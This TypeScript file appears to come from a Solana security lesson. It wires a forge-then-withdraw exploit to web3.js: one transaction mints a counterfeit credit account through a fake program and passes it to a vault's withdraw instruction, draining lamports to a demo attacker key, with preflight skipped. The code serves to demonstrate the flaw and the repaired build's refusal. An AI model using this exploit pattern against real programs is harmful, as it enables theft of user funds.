/**
 * ownerPorts.ts — where lesson two's decisions meet web3.js for real.
 *
 * `ownerChain.ts` builds the instructions and `ownerRun.ts` decides the order;
 * this is the thin adapter that turns both into bytes and hands them to an RPC.
 * It is deliberately small: everything that could be wrong *as a decision* lives
 * above it and is tested without a network.
 *
 * The attack is one message with two instructions — forge, then withdraw — for
 * a reason worth stating. A forged credit has to be *written* by the program
 * that owns it, and on Solana that write is a program call. Chaining them in one
 * transaction is what makes "the attacker mints a credit and hands it straight
 * to the protocol" a single, atomic act.
 */

import { Buffer } from 'buffer';
import {
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  type Connection,
} from '@solana/web3.js';
import {
  OPEN_VAULT_DISCRIMINATOR,
  forgeAccounts,
  forgeInstructionData,
  openVaultAccounts,
  ownerWithdrawAccounts,
  ownerWithdrawInstructionData,
} from './ownerChain';
import type { OwnerPorts, OwnerVaultReader } from './ownerRun';

/** Only the RPC calls lesson two needs; a real `Connection` satisfies it. */
export type OwnerConnection = Pick<
  Connection,
  'getLatestBlockhash' | 'sendRawTransaction' | 'getSignatureStatuses' | 'getAccountInfo'
>;

/** Read the one vault: whether it is there, and what it holds. */
export function createOwnerVaultReader(connection: OwnerConnection): OwnerVaultReader {
  return async (vault: PublicKey) => {
    const info = await connection.getAccountInfo(vault);
    return { exists: info !== null, lamports: info?.lamports ?? 0 };
  };
}

/** A recent blockhash for a transaction message. */
async function blockhash(connection: OwnerConnection): Promise<string> {
  return (await connection.getLatestBlockhash()).blockhash;
}

/** Wait until the cluster has confirmed — or finalized — a signature. */
async function settle(connection: OwnerConnection, signature: string): Promise<void> {
  for (let attempt = 0; attempt < 40; attempt += 1) {
    const { value } = await connection.getSignatureStatuses([signature]);
    const status = value?.[0];
    if (status && (status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized')) {
      return;
    }
    await new Promise((resolve) => setTimeout(resolve, 750));
  }
  throw new Error(`a setup transaction was not confirmed in time (${signature})`);
}

/**
 * The real ports for lesson two.
 *
 * The signer is the attacker: fee payer, the vault's authority when it has to
 * open one, the credit's payer, and the withdrawal's recipient. It is the demo
 * keypair, so a visitor with no wallet can still watch real lamports move.
 */
export function ownerPorts(connection: OwnerConnection, signer: Keypair): OwnerPorts {
  const systemProgram = SystemProgram.programId;

  const send = async (instructions: TransactionInstruction[], extraSigners: Keypair[]) => {
    const transaction = new Transaction({
      feePayer: signer.publicKey,
      recentBlockhash: await blockhash(connection),
    });
    for (const instruction of instructions) transaction.add(instruction);
    transaction.sign(signer, ...extraSigners);
    return connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true });
  };

  return {
    latestBlockhash: () => blockhash(connection),

    signatureStatus: async (signature) => {
      const { value } = await connection.getSignatureStatuses([signature]);
      const status = value?.[0];
      if (!status) return null;
      const settled =
        status.confirmationStatus === 'confirmed' || status.confirmationStatus === 'finalized';
      return settled ? { err: status.err ?? null } : null;
    },

    /**
     * Make sure the one vault exists and holds at least `amount`.
     *
     * Both steps are conditional and separate: a vault that survives a run (it
     * keeps its rent) is topped up rather than re-opened, and a vault that was
     * drained to nothing is opened again, exactly as the protocol would. Neither
     * step attacks anything — they only put the target back where the protocol
     * last left it.
     */
    ensureVault: async ({ programId, vault, amount }) => {
      let info = await connection.getAccountInfo(vault);

      if (!info) {
        const signature = await send(
          [
            new TransactionInstruction({
              programId,
              keys: openVaultAccounts(vault, signer.publicKey, systemProgram),
              data: Buffer.from(OPEN_VAULT_DISCRIMINATOR),
            }),
          ],
          [],
        );
        await settle(connection, signature);
        info = await connection.getAccountInfo(vault);
      }

      const held = BigInt(info?.lamports ?? 0);
      if (held < BigInt(amount)) {
        const signature = await send(
          [
            SystemProgram.transfer({
              fromPubkey: signer.publicKey,
              toPubkey: vault,
              lamports: Number(BigInt(amount) - held),
            }),
          ],
          [],
        );
        await settle(connection, signature);
      }
    },

    /**
     * Forge the credit, then hand it straight to `withdraw`.
     *
     * `skipPreflight` is load-bearing, as it is for lesson one: the repaired
     * build's transaction would be rejected in simulation, so with preflight on
     * there would be no signature to point at — and the failed transaction is
     * the evidence for the refusal.
     */
    forgeAndWithdraw: async (target, recentBlockhash) => {
      const transaction = new Transaction({
        feePayer: signer.publicKey,
        recentBlockhash,
      });

      transaction.add(
        new TransactionInstruction({
          programId: target.counterfeitProgramId,
          keys: forgeAccounts(target.creditKeypair.publicKey, signer.publicKey, systemProgram),
          data: Buffer.from(forgeInstructionData(target.amount)),
        }),
      );
      transaction.add(
        new TransactionInstruction({
          programId: target.programId,
          keys: ownerWithdrawAccounts(target.vault, target.creditKeypair.publicKey, signer.publicKey),
          data: Buffer.from(ownerWithdrawInstructionData()),
        }),
      );

      // Both sign: the demo key pays and receives, and the forged account has to
      // sign for its own creation.
      transaction.sign(signer, target.creditKeypair);

      return connection.sendRawTransaction(transaction.serialize(), { skipPreflight: true });
    },
  };
}
